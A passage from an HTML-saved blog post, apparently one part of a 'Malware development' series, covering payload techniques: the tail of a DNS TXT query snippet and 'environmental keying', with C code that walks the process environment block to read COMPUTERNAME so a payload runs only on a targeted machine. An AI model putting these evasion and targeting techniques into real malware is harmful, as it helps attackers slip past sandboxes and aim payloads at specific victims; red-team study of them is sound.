    <span class="n">DNS_QUERY_TREAT_AS_FQDN</span> <span class="o">|</span> <span class="n">DNS_QUERY_BYPASS_CACHE</span> <span class="o">|</span> <span class="n">DNS_QUERY_NO_HOSTS_FILE</span> <span class="o">|</span> <span class="n">DNS_QUERY_NO_NETBT</span> <span class="o">|</span> <span class="n">DNS_QUERY_NO_MULTICAST</span> <span class="o">|</span> <span class="n">DNS_QUERY_WIRE_ONLY</span> <span class="o">|</span> <span class="n">DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ppDNSQueryResults</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">PCHAR</span> <span class="n">txtData</span> <span class="o">=</span> <span class="n">ppDNSQueryResults</span><span class="o">-&gt;</span><span class="n">Data</span><span class="p">.</span><span class="n">TXT</span><span class="p">.</span><span class="n">pStringArray</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">txtData</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="environmental-keying">Environmental keying</h2>
<p>This one is somewhat similar to sandbox evasion based on user names, 
domain names etc. However the idea here is to target specific 
organization or even a person with our payload by making sure that is 
won’t execute on a wrong machine. Specific environmental traits (like 
mentioned AD domain name) can be used in conditional statements or even 
for data decryption. This is actually catalogued as a MITRE ATT&amp;CK 
technique: <a href="https://attack.mitre.org/techniques/T1480/001/">Execution Guardrails: Environmental Keying</a>.</p>

<p>So basically this is a combination of environment-based sandbox 
evasion and obfuscation by encryption/encoding. Also, there is a cool 
trick to get environmental variables without using Windows API - it is 
possible to retrieve the data directly from PEB. Let’s take a quick look
 into x64 process environment block:</p>

<p><img src="Malware%20development%20part%205%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/peb1.png" alt="peb1.png"></p>

<p>We have a <code class="language-plaintext highlighter-rouge">ProcessParameters</code> structure pointer at <code class="language-plaintext highlighter-rouge">0x20</code> (this would be <code class="language-plaintext highlighter-rouge">0x10</code> for <code class="language-plaintext highlighter-rouge">x86</code> architecture). The <code class="language-plaintext highlighter-rouge">_RTL_USER_PROCESS_PARAMETERS</code> structure has a pointer to an array of environment strings at <code class="language-plaintext highlighter-rouge">0x80</code>:</p>

<p><img src="Malware%20development%20part%205%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/peb2.png" alt="peb2.png"></p>

<p>We then can loop through all environmental variables until we find the one called <code class="language-plaintext highlighter-rouge">COMPUTERNAME</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PPEB</span> <span class="n">pPEB</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
<span class="n">PVOID</span> <span class="n">params</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">PQWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pPEB</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="n">PWSTR</span> <span class="n">environmental_variables</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">PQWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">params</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">);</span>

<span class="k">while</span> <span class="p">(</span><span class="n">environmental_variables</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PWSTR</span> <span class="n">m</span> <span class="o">=</span> <span class="n">wcsstr</span><span class="p">(</span><span class="n">environmental_variables</span><span class="p">,</span> <span class="s">L"COMPUTERNAME="</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
    <span class="n">environmental_variables</span> <span class="o">+=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">environmental_variables</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">PWSTR</span> <span class="n">computerName</span> <span class="o">=</span> <span class="n">wcsstr</span><span class="p">(</span><span class="n">environmental_variables</span><span class="p">,</span> <span class="s">L"="</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="n">wcslwr</span><span class="p">(</span><span class="n">computerName</span><span class="p">);</span>
<span class="n">wprintf</span><span class="p">(</span><span class="s">L"%s"</span><span class="p">,</span> <span class="n">computerName</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="summary">Summary</h2>
<p>We’ve gone through some cool techniques used by malware. Hope you’ll find that useful (but not for malicious purposes :)</p>

<p>In the next article we will talk about using LLVM obfuscation.</p>

  </div>

  <div class="date">
    Written on November  4, 2020
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          



<a href="https://github.com/0xPat"><i class="svg-icon github"></i></a>

<a href="https://www.linkedin.com/in/patryk-czeczko"><i class="svg-icon linkedin"></i></a>


<a href="https://www.twitter.com/0xPat"><i class="svg-icon twitter"></i></a>



        </footer>
      </div>
    </div>

    

  

</body></html>